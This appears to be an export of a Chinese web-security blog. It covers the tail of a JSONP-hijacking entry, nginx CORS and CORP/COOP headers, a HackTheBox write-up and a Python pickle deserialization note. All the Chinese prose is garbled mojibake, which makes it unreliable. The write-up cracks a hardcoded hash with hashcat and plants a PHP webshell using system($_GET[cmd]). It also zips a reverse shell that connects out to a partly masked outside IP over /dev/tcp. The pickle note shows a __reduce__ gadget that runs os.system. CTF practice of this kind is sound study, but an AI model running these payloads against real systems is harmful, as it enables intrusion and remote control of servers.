class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€æ—¦è¢«æ”»å‡»è€…è®¿é—®è¯¥ç½‘é¡µï¼Œå°±ä¼šè‡ªåŠ¨è§¦å‘ï¼Œä¼šè‡ªåŠ¨è®¿é—®å…·æœ‰æ¼æ´çš„jsonpæ¥å£ï¼Œåˆ©ç”¨è¢«æ”»å‡»è€…è‡ªå·±çš„sessionè·å–åˆ°è¢«æ”»å‡»è€…çš„ä¿¡æ¯ï¼Œå¹¶å°†è¯¥ä¿¡æ¯è¿œç¨‹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Š</p><h2 id="å…¶ä»–è§£å†³è·¨åŸŸé—®é¢˜çš„æ–¹æ¡ˆ"><a href="#å…¶ä»–è§£å†³è·¨åŸŸé—®é¢˜çš„æ–¹æ¡ˆ" class="headerlink" title="å…¶ä»–è§£å†³è·¨åŸŸé—®é¢˜çš„æ–¹æ¡ˆ"></a><a href="https://blog.csdn.net/qq_51383106/article/details/131458419">å…¶ä»–è§£å†³è·¨åŸŸé—®é¢˜çš„æ–¹æ¡ˆ</a></h2><p>åˆ©ç”¨nginxè¿›è¡Œåå‘ä»£ç†ï¼Œåœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šé…ç½®å¤šä¸ªå‰ç¼€æ¥è½¬å‘http&#x2F;httpsè¯·æ±‚åˆ°å¤šä¸ªçœŸå®çš„æœåŠ¡å™¨å³å¯ã€‚åœ¨ nginx ä¸­é…ç½®åå‘ä»£ç†æœåŠ¡å™¨ï¼Œå°†å®¢æˆ·ç«¯çš„è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ï¼Œå¹¶åœ¨è½¬å‘è¿‡ç¨‹ä¸­æ·»åŠ ç›¸åº”çš„å“åº”å¤´ã€‚ä¾‹å¦‚ï¼Œå‡è®¾å‰ç«¯æœåŠ¡å™¨è¿è¡Œåœ¨ <a href="http://frontend.example.com,åç«¯æœåŠ¡å™¨è¿è¡Œåœ¨/">http://frontend.example.comï¼Œåç«¯æœåŠ¡å™¨è¿è¡Œåœ¨</a> <a href="http://backend.example.com,åˆ™å¯ä»¥åœ¨/">http://backend.example.comï¼Œåˆ™å¯ä»¥åœ¨</a> nginx ä¸­é…ç½®å¦‚ä¸‹çš„åå‘ä»£ç†æœåŠ¡å™¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name frontend.example.com;</span><br><span class="line"></span><br><span class="line">    location /api &#123;</span><br><span class="line">        proxy_pass http://backend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Origin http://frontend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Credentials true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°é…ç½®ä¸­ï¼Œlocation &#x2F;api å°†å®¢æˆ·ç«¯è¯·æ±‚ä¸­çš„ &#x2F;api è½¬å‘åˆ°åç«¯æœåŠ¡å™¨çš„å¯¹åº”æ¥å£ã€‚<br>add_header Access-Control-Allow-Origin <a href="http://frontend.example.com/">http://frontend.example.com</a> è¡¨ç¤ºå…è®¸æ¥è‡ª <a href="http://frontend.example.com/">http://frontend.example.com</a> çš„è·¨åŸŸè¯·æ±‚ã€‚<br>add_header Access-Control-Allow-Credentials true è¡¨ç¤ºå…è®¸è·¨åŸŸè¯·æ±‚æºå¸¦ cookieã€‚<br>è®¾ç½®ç›¸åº”çš„å“åº”å¤´åœ¨å“åº”å¤´ä¸­æ·»åŠ ç›¸åº”çš„è·¨åŸŸè®¾ç½®ï¼Œä»¥å…è®¸å®¢æˆ·ç«¯å‘é€è·¨åŸŸè¯·æ±‚å’Œæºå¸¦ cookieã€‚ä¾‹å¦‚ï¼Œæ·»åŠ  Access-Control-Allow-Origin å’Œ Access-Control-Allow-Credentials å¤´éƒ¨ï¼šAccess-Control-Allow-Origin: <a href="http://frontend.example.com/">http://frontend.example.com</a><br>Access-Control-Allow-Credentials: trueè¿™æ ·å®¢æˆ·ç«¯åœ¨å‘åç«¯æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œå°±èƒ½æºå¸¦ cookieï¼Œå¹¶å…è®¸è·¨åŸŸè¯·æ±‚ã€‚</p><p>è¿˜æœ‰å¾ˆå¤šå‰ç«¯è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼š<a href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p><h2 id="æ–°çš„å®‰å…¨æªæ–½-CORP-COOP"><a href="#æ–°çš„å®‰å…¨æªæ–½-CORP-COOP" class="headerlink" title="æ–°çš„å®‰å…¨æªæ–½ CORP COOP"></a>æ–°çš„å®‰å…¨æªæ–½ CORP COOP</h2><p><a href="https://www.cnblogs.com/Yangyecool/p/13417794.html">https://www.cnblogs.com/Yangyecool/p/13417794.html</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy</a><br>åœ¨ç°ä»£æµè§ˆå™¨å®‰å…¨ä¸­ï¼Œé™¤äº†CORSä»¥å¤–ï¼Œè¿˜æœ‰ä¸¤ä¸ªç›¸å¯¹è¾ƒæ–°çš„å®‰å…¨ç­–ç•¥ï¼Œåˆ†åˆ«æ˜¯CORPï¼ˆCross-Origin Resource Policyï¼‰å’ŒCOOPï¼ˆCross-Origin Opener Policyï¼‰ã€‚è¿™ä¸¤ç§ç­–ç•¥éƒ½æ˜¯ä¸ºäº†è¿›ä¸€æ­¥åŠ å¼ºè·¨åŸŸå®‰å…¨ï¼Œå°¤å…¶æ˜¯åœ¨é˜²æ­¢æŸäº›ç±»å‹çš„è·¨ç«™æ”»å‡»ï¼ˆå¦‚è·¨ç«™è„šæœ¬å’Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰å’Œæ•°æ®æ³„éœ²æ–¹é¢ã€‚<br>åŒæºç­–ç•¥ä¹Ÿæœ‰ä¸€äº›ä¾‹å¤–ï¼Œä»»ä½•ç½‘ç«™éƒ½å¯ä»¥ä¸å—é™åˆ¶çš„åŠ è½½ä¸‹é¢çš„èµ„æºï¼š</p><ul><li>åµŒå…¥è·¨åŸŸ iframe</li><li>imageã€script ç­‰èµ„æº</li><li>ä½¿ç”¨ DOM æ‰“å¼€è·¨åŸŸå¼¹å‡ºçª—å£<br>å¯¹äºè¿™äº›èµ„æºï¼Œæµè§ˆå™¨å¯ä»¥å°†å„ä¸ªç«™ç‚¹çš„è·¨åŸŸèµ„æºåˆ†éš”åœ¨ä¸åŒçš„ Context Group ä¸‹ï¼Œä¸åŒçš„ Context Group ä¸‹èµ„æºæ— æ³•ç›¸äº’è®¿é—®ã€‚<br>æµè§ˆå™¨ Context Group æ˜¯ä¸€ç»„å…±äº«ç›¸åŒä¸Šä¸‹æ–‡çš„ tabã€windowæˆ–iframeã€‚ä¾‹å¦‚ï¼Œå¦‚æœç½‘ç«™ï¼ˆ<a href="https://a.example)æ‰“å¼€å¼¹å‡ºçª—å£(https//b.example%EF%BC%89%EF%BC%8C%E5%88%99%E6%89%93%E5%BC%80%E5%99%A8%E7%AA%97%E5%8F%A3%E5%92%8C%E5%BC%B9%E5%87%BA%E7%AA%97%E5%8F%A3%E5%85%B1%E4%BA%AB%E7%9B%B8%E5%90%8C%E7%9A%84%E6%B5%8F%E8%A7%88%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%AE%83%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87">https://a.exampleï¼‰æ‰“å¼€å¼¹å‡ºçª—å£ï¼ˆhttps://b.exampleï¼‰ï¼Œåˆ™æ‰“å¼€å™¨çª—å£å’Œå¼¹å‡ºçª—å£å…±äº«ç›¸åŒçš„æµè§ˆä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥é€šè¿‡</a> DOM APIç›¸äº’è®¿é—®ï¼Œä¾‹å¦‚ window.openerã€‚</li></ul><p>é•¿ä¹…ä»¥æ¥ï¼Œè¿™äº›å®‰å…¨ç­–ç•¥ä¸€ç›´ä¿æŠ¤ç€ç½‘ç«™çš„éšç§æ•°æ®ï¼Œç›´åˆ° Spectre æ¼æ´å‡ºç°ã€‚Spectre æ˜¯ä¸€ä¸ªåœ¨ CPU ä¸­è¢«å‘ç°çš„æ¼æ´ï¼Œåˆ©ç”¨ Spectre ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–åˆ°åœ¨ç»Ÿä¸€æµè§ˆå™¨ä¸‹ä»»æ„ Context Group ä¸‹çš„èµ„æºã€‚ç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨ä¸€äº›éœ€è¦å’Œè®¡ç®—æœºç¡¬ä»¶è¿›è¡Œäº¤äº’çš„ API æ—¶ï¼š</p><ul><li>SharedArrayBuffer (required for WebAssembly Threads)</li><li>performance.measureMemory()</li><li>JS Self-Profiling API<br>ä¸ºæ­¤ï¼Œæµè§ˆå™¨ä¸€åº¦ç¦ç”¨äº† SharedArrayBuffer ç­‰é«˜é£é™©çš„ APIã€‚</li></ul><h3 id="CORPï¼ˆCross-Origin-Resource-Policyï¼‰"><a href="#CORPï¼ˆCross-Origin-Resource-Policyï¼‰" class="headerlink" title="CORPï¼ˆCross-Origin Resource Policyï¼‰"></a>CORPï¼ˆCross-Origin Resource Policyï¼‰</h3><p><strong>CORP</strong> æ˜¯ä¸€ç§æµè§ˆå™¨å®‰å…¨ç­–ç•¥ï¼Œå…è®¸å¼€å‘è€…é™åˆ¶å“ªäº›è·¨æºè¯·æ±‚å¯ä»¥åŠ è½½èµ„æºã€‚è¿™ä¸ªç­–ç•¥ä¸»è¦æ˜¯é€šè¿‡ HTTP å“åº”å¤´ <code>Cross-Origin-Resource-Policy</code> å®ç°çš„ï¼Œå¯ä»¥æ§åˆ¶èµ„æºï¼ˆå¦‚å›¾åƒã€CSSã€JavaScriptç­‰ï¼‰æ˜¯å¦å¯ä»¥è¢«å¦ä¸€ä¸ªåŸŸåŠ è½½ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š<br>CORP ä¸»è¦ç”¨äºé˜²æ­¢èµ„æºè¢«ä¸åŒæºçš„ç½‘ç«™è¯»å–æˆ–åµŒå…¥ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªç½‘ç«™å¯ä»¥å†³å®šå…¶èµ„æºåªèƒ½ç”±åŒæºç½‘ç«™æˆ–ç‰¹å®šçš„æºç½‘ç«™åŠ è½½ã€‚<br><strong>å“åº”å¤´é€‰é¡¹</strong>ï¼š</p><ul><li><code>Cross-Origin-Resource-Policy: same-origin</code>ï¼šåªæœ‰åŒæºçš„ç«™ç‚¹å¯ä»¥åŠ è½½èµ„æºã€‚</li><li><code>Cross-Origin-Resource-Policy: same-site</code>ï¼šåªæœ‰ç›¸åŒç«™ç‚¹ï¼ˆå³é¡¶çº§åŸŸåç›¸åŒï¼‰çš„è¯·æ±‚å¯ä»¥åŠ è½½èµ„æºã€‚</li><li><code>Cross-Origin-Resource-Policy: cross-origin</code>ï¼šä»»ä½•ç½‘ç«™éƒ½å¯ä»¥åŠ è½½èµ„æºã€‚è¿™ç›¸å½“äºæ²¡æœ‰åº”ç”¨ä»»ä½•CORPã€‚</li></ul><h3 id="COOPï¼ˆCross-Origin-Opener-Policyï¼‰"><a href="#COOPï¼ˆCross-Origin-Opener-Policyï¼‰" class="headerlink" title="COOPï¼ˆCross-Origin Opener Policyï¼‰"></a>COOPï¼ˆCross-Origin Opener Policyï¼‰</h3><p><strong>COOP</strong> æ˜¯ä¸€ç§æµè§ˆå™¨å®‰å…¨ç­–ç•¥ï¼Œç”¨äºéš”ç¦»æ¥è‡ªä¸åŒæºçš„æµè§ˆå™¨ä¸Šä¸‹æ–‡ï¼ˆå¦‚çª—å£å’Œæ ‡ç­¾é¡µï¼‰ï¼Œä»è€Œé˜²æ­¢æ½œåœ¨çš„æ¶æ„æ–‡æ¡£å½±å“æ­£å¸¸æ–‡æ¡£ï¼Œæˆ–åœ¨ä¸¤è€…ä¹‹é—´è¿›è¡Œæ•°æ®æ³„éœ²ã€‚è¿™ä¸ªç­–ç•¥ä¸»è¦é€šè¿‡ HTTP å“åº”å¤´ <code>Cross-Origin-Opener-Policy</code> æ¥è®¾ç½®ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼š<br>COOP ä¸»è¦ç”¨äºåˆ›å»ºä¸€ä¸ªå®‰å…¨çš„ç¯å¢ƒï¼Œå…¶ä¸­çš„é¡µé¢ä¸ä¼šä¸ä¸åŒæºçš„é¡µé¢å…±äº«ç›¸åŒçš„è¿›ç¨‹ï¼Œå› æ­¤å¯ä»¥é˜»æ­¢æ¶æ„ç½‘ç«™é€šè¿‡çª—å£é—´é€šä¿¡ï¼ˆå¦‚ <code>window.opener</code>ï¼‰æ¥æ³„éœ²ä¿¡æ¯æˆ–è¿›è¡Œæ”»å‡»ã€‚<br><strong>å“åº”å¤´é€‰é¡¹</strong>ï¼š</p><ul><li><code>Cross-Origin-Opener-Policy: same-origin</code>ï¼šåªæœ‰åŒæºçš„é¡µé¢æ‰èƒ½ä¸å½“å‰é¡µé¢å…±äº«åŒä¸€ä¸ªæµè§ˆå™¨è¿›ç¨‹ã€‚</li><li><code>Cross-Origin-Opener-Policy: same-origin-allow-popups</code>ï¼šä¸ <code>same-origin</code> ç›¸åŒï¼Œä½†å…è®¸å¼¹å‡ºçª—å£ï¼ˆç”±å½“å‰é¡µé¢åˆ›å»ºï¼‰ä¸å…¶å…±äº«åŒä¸€ä¸ªè¿›ç¨‹ã€‚</li><li><code>Cross-Origin-Opener-Policy: unsafe-none</code>ï¼šä¸éš”ç¦»æºï¼Œæ‰€æœ‰é¡µé¢å…±äº«åŒä¸€è¿›ç¨‹ï¼Œè¿™æ˜¯å¤§å¤šæ•°é¡µé¢çš„é»˜è®¤è¡Œä¸ºã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€hacktheboxã€‘è§£é¢˜è®°å½•</title>
      <link href="/2024/09/19/WebSecurity/ctf/hackthebox/"/>
      <url>/2024/09/19/WebSecurity/ctf/hackthebox/</url>
      
        <content type="html"><![CDATA[<h2 id="Sightless"><a href="#Sightless" class="headerlink" title="Sightless"></a>Sightless</h2><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><p>å…ˆç”¨nmapæ‰«æä¸€ä¸‹ï¼š<code>nmap -sC -sV 10.10.11.32 -T4 -oN nmap.txt</code><br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image.png" alt="ç«¯å£å¼€æ”¾"><br>å‘ç°æœ‰webæœåŠ¡ï¼Œè®¿é—®webé¡µé¢ã€‚å¦å¤–å­˜åœ¨ftpå’ŒsshæœåŠ¡ï¼Œè¿™äº›éƒ½å¯èƒ½æ˜¯åé¢çš„çªç ´ç‚¹ï¼Œå…ˆçœ‹ä¸‹webæœåŠ¡ã€‚<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-1.png" alt="Unknown host"><br>éœ€è¦ä¿®æ”¹ä¸‹hostæ–‡ä»¶äº†ï¼Œæ·»åŠ ä¸€è¡Œ <code>10.10.11.32 sightless.htb</code><br>è®¿é—®<code>http://sightless.htb</code><br>é¡µé¢ä¸­åªæœ‰ä¸€ä¸ªSQLPadæ˜¯æœ‰ç”¨çš„ï¼Œæˆ‘ä»¬è®¿é—®è¿™ä¸ªé¡µé¢ï¼ˆä»ç„¶éœ€è¦ä¿®æ”¹hostæ–‡ä»¶ï¼‰<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-2.png" alt="SQLPad"><br>é¦–å…ˆæƒ³åˆ°çš„æ˜¯SQLPadåº”è¯¥æ˜¯ä¼šæœ‰ä¸€äº›CVEåœ¨çš„ï¼Œç™¾åº¦æœä¸€ä¸‹å‘ç°æœ‰ä¸ª<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-3.png" alt="CVE"><br>åˆšå¥½å’Œå½“å‰çš„ç‰ˆæœ¬æ˜¯ä¸€è‡´çš„</p><p>å¤ªå¯„äº†<br><a href="https://medium.com/@vikram1337/sightless-hackthebox-9599be0ee25b">https://medium.com/@vikram1337/sightless-hackthebox-9599be0ee25b</a></p><h3 id="GreenHorn"><a href="#GreenHorn" class="headerlink" title="GreenHorn"></a>GreenHorn</h3><p><a href="https://blog.csdn.net/zegeai/article/details/122660540">https://blog.csdn.net/zegeai/article/details/122660540</a><br><a href="https://blog.csdn.net/weixin_63279914/article/details/142436931">https://blog.csdn.net/weixin_63279914/article/details/142436931</a><br><a href="https://blog.csdn.net/qq_23003811/article/details/140635016">https://blog.csdn.net/qq_23003811/article/details/140635016</a></p><p>è¿˜æ˜¯å¸¸è§„çš„å…ˆè¿›è¡Œä¿¡æ¯æœé›†ï¼Œæ¢æµ‹ä¸‹ç«¯å£<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-4.png"><br>80ã€3000ã€9001éƒ½å¼€æ”¾äº†ï¼Œè®¿é—®webæœåŠ¡ï¼ˆä¿®æ”¹hostï¼‰<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-5.png" alt="çœ‹ä¸Šå»æ˜¯ä¸ªè®ºå›"><br>è¿›ä¸€æ­¥æœé›†å‘ç°æ•°æ®åŒ…ä¸­æœ‰cmsä¿¡æ¯æŒ‡çº¹ï¼špluck 4.7.18ï¼Œç™¾åº¦äº†ä¸‹æœ‰CVEæ¼æ´ï¼Œæ˜¯æ–‡ä»¶ä¸Šä¼ çš„å‘½ä»¤æ‰§è¡Œï¼Œä½†éœ€è¦é¦–å…ˆç™»å½•åˆ°åå°ï¼Œå°è¯•çŒœäº†ä¸‹å¯†ç ï¼Œå¤±è´¥äº†ã€‚<br>è¿˜æœ‰ä¸¤ä¸ªç«¯å£æ²¡çœ‹ï¼Œè¯•è¯•çœ‹æœ‰æ²¡æœ‰æ–°æ€è·¯ï¼Œè®¿é—®3000ç«¯å£ï¼Œçœ‹ä¸Šå»æ˜¯ä¸€ä¸ªç±»ä¼¼gitçš„å†…éƒ¨ç‰ˆæœ¬æ§åˆ¶å¹³å°ï¼Œæ³¨å†Œè´¦å·è¿›å…¥åå‘ç°æœ‰å¥—æºä»£ç ï¼Œå°±æ˜¯ä¸Šé¢çš„pluck<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-6.png"><br>ä¸‹è½½åˆ†æï¼Œç›´æ¥çœ‹login.phpï¼Œæœ‰ç›¸åº”çš„ç™»é™†é€»è¾‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha512&#x27;</span>, <span class="variable">$cont1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$pass</span> == <span class="variable">$ww</span>) &amp;&amp; (!<span class="keyword">isset</span>(<span class="variable">$login_error</span>))) &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$token</span>] = <span class="string">&#x27;pluck_loggedin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Delete loginattempt file, if it exists.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(LOGIN_ATTEMPT_FILE))</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(LOGIN_ATTEMPT_FILE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display success message.</span></span><br><span class="line"><span class="title function_ invoke__">show_error</span>(<span class="variable">$lang</span>[<span class="string">&#x27;login&#x27;</span>][<span class="string">&#x27;correct&#x27;</span>], <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;pluck_before&#x27;</span>]))</span><br><span class="line"><span class="title function_ invoke__">redirect</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;pluck_before&#x27;</span>], <span class="number">1</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;admin.php?action=start&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;data/inc/footer.php&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¨å±€æ£€ç´¢ <code>$ww</code> ctrl+shift+F å‘ç°å¯†ç ç¡¬ç¼–ç åœ¨æ–‡ä»¶ä¸­ï¼Œæ˜¯ç»è¿‡sha512å“ˆå¸Œåçš„ã€‚<br>ç½‘ä¸ŠæŸ¥äº†ä¸‹ï¼Œå¯ä»¥ç”¨hashcatçˆ†ç ´ä¸‹ï¼Œç”¨åˆ°äº†kaliè‡ªå¸¦çš„å­—å…¸ <code>wordlists/rockyou.txt</code>çˆ†ç ´è¯­å¥å¦‚ä¸‹<br><code>hashcat -a 0 -m 1700 &#39;d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163&#39; /usr/share/wordlists/rockyou.txt</code><br>ä¸Šé¢çš„å‘½ä»¤æ˜¯ä½¿ç”¨hashcatï¼Œä¸€ä¸ªå¹¿æ³›ä½¿ç”¨çš„å¯†ç æ¢å¤å·¥å…·ï¼Œæ¥å°è¯•ç ´è§£å“ˆå¸Œå€¼ã€‚hashcat æ”¯æŒå¤šç§åŠ å¯†ç®—æ³•ï¼Œå¹¶èƒ½åˆ©ç”¨CPUå’ŒGPUçš„å¼ºå¤§åŠ›é‡æ¥åŠ é€Ÿå¯†ç çš„æ¢å¤è¿‡ç¨‹ã€‚è¿™é‡Œæ˜¯å‘½ä»¤çš„è¯¦ç»†è§£æï¼š</p><ul><li><code>-a 0</code>: è¿™ä¸ªé€‰é¡¹æŒ‡å®šäº†æ”»å‡»æ¨¡å¼ï¼Œ<code>0</code>ä»£è¡¨ç›´æ¥å­—å…¸æ”»å‡»ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œhashcat ä¼šä½¿ç”¨ä¸€ä¸ªå­—å…¸æ–‡ä»¶ä¸­çš„æ¯ä¸€ä¸ªè¯æ¡æ¥ç”Ÿæˆå“ˆå¸Œï¼Œç„¶åä¸ç»™å®šçš„å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒã€‚</li><li><code>-m 1700</code>: è¿™ä¸ªé€‰é¡¹æŒ‡å®šäº†å“ˆå¸Œç±»å‹ï¼Œ<code>1700</code>ä»£è¡¨SHA-512ç®—æ³•ã€‚hashcat æ”¯æŒå¤šç§å“ˆå¸Œç®—æ³•ï¼Œæ¯ç§ç®—æ³•éƒ½æœ‰ä¸€ä¸ªç‹¬ç‰¹çš„ä»£ç ã€‚</li><li><code>/usr/share/wordlists/rockyou.txt</code>: è¿™æ˜¯å­—å…¸æ–‡ä»¶çš„è·¯å¾„ã€‚<code>rockyou.txt</code>æ˜¯ä¸€ä¸ªéå¸¸è‘—åçš„å¯†ç å­—å…¸ï¼ŒåŒ…å«äº†æ•°ç™¾ä¸‡å¸¸ç”¨å¯†ç ï¼Œè¿™äº›å¯†ç æ˜¯ä»å†å²æ•°æ®æ³„éœ²ä¸­æ±‡ç¼–è€Œæˆã€‚hashcat å°†ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ä¸­çš„æ¯ä¸€ä¸ªè¯æ¡ä½œä¸ºè¾“å…¥ï¼Œç”Ÿæˆå“ˆå¸Œå€¼ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦ä¸ç›®æ ‡å“ˆå¸Œå€¼åŒ¹é…ã€‚<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-7.png"><br>æ ¹æ®è¾“å‡ºç»“æœå¯ä»¥åˆ¤æ–­æˆåŠŸçˆ†ç ´å‡ºå¯†ç ï¼šiloveyou1ï¼ŒæˆåŠŸç™»é™†åå°ã€‚<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-8.png"><br>åˆ©ç”¨pluckçš„æ¼æ´ï¼Œæ„é€ æ–‡ä»¶phpinfo.phpï¼Œ<code>&lt;?php phpinfo();system($_GET[cmd]);?&gt;</code>ï¼Œå¹¶å‹ç¼©æˆå‹ç¼©åŒ…ï¼Œphpinfo.zipã€‚ä¸Šä¼ ä¹‹åè‡ªåŠ¨è·³è½¬<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-9.png"><br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-10.png" alt="æˆåŠŸçœ‹åˆ°phpinfoç•Œé¢"><br>ä½†åç»­æŒ‰ç…§ä¸Šé¢çš„åšå®¢ç»§ç»­å°è¯•ï¼Œå‘ç°ä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè¢«æ‹¦æˆªäº†ï¼Œå°è¯•ç›´æ¥åå¼¹shellï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/106.54.6.xxx/4444 0&gt;&amp;1&#x27; &quot;); ?&gt;</span><br><span class="line">zip rev.zip rev.php </span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘ååºåˆ—åŒ–æ¼æ´åˆ†æç¬”è®° - ç¬¬ä¸‰éƒ¨åˆ† Pythonååºåˆ—åŒ–åˆ†æ</title>
      <link href="/2024/09/18/WebSecurity/owasptop/pythondeserialization-md/"/>
      <url>/2024/09/18/WebSecurity/owasptop/pythondeserialization-md/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>Pythonçš„åºåˆ—åŒ–å’ŒPHPçš„å¾ˆåƒ</p><p>Pythonåºåˆ—åŒ–ç›¸å…³å‡½æ•°ï¼š<br>pickle.dump(obj, file) : å°†å¯¹è±¡åºåˆ—åŒ–åä¿å­˜åˆ°æ–‡ä»¶<br>pickle.load(file) : è¯»å–æ–‡ä»¶ï¼Œ å°†æ–‡ä»¶ä¸­çš„åºåˆ—åŒ–å†…å®¹ååºåˆ—åŒ–ä¸ºå¯¹è±¡<br>pickle.dumps(obj) : å°†å¯¹è±¡åºåˆ—åŒ–æˆå­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµ<br>pickle.loads(bytes_obj) : å°†å­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµååºåˆ—åŒ–ä¸ºå¯¹è±¡</p><p>åŒæ ·ï¼Œåœ¨Pythonä¸­ä¹Ÿå­˜åœ¨é­”æœ¯æ–¹æ³•ï¼š<br><code>__reduce__()</code>ååºåˆ—åŒ–æ—¶è°ƒç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br></pre></td></tr></table></figure><p><code>__init__</code> æœ¬è´¨å°±æ˜¯pythonä¸­çš„æ„é€ å‡½æ•°ï¼Œåœ¨å¯¹è±¡è¢«å®ä¾‹åŒ–æ—¶è°ƒç”¨<br><code>__reduce_ex__()</code> ååºåˆ—åŒ–æ—¶è°ƒç”¨<br><code>__setstate__()</code> 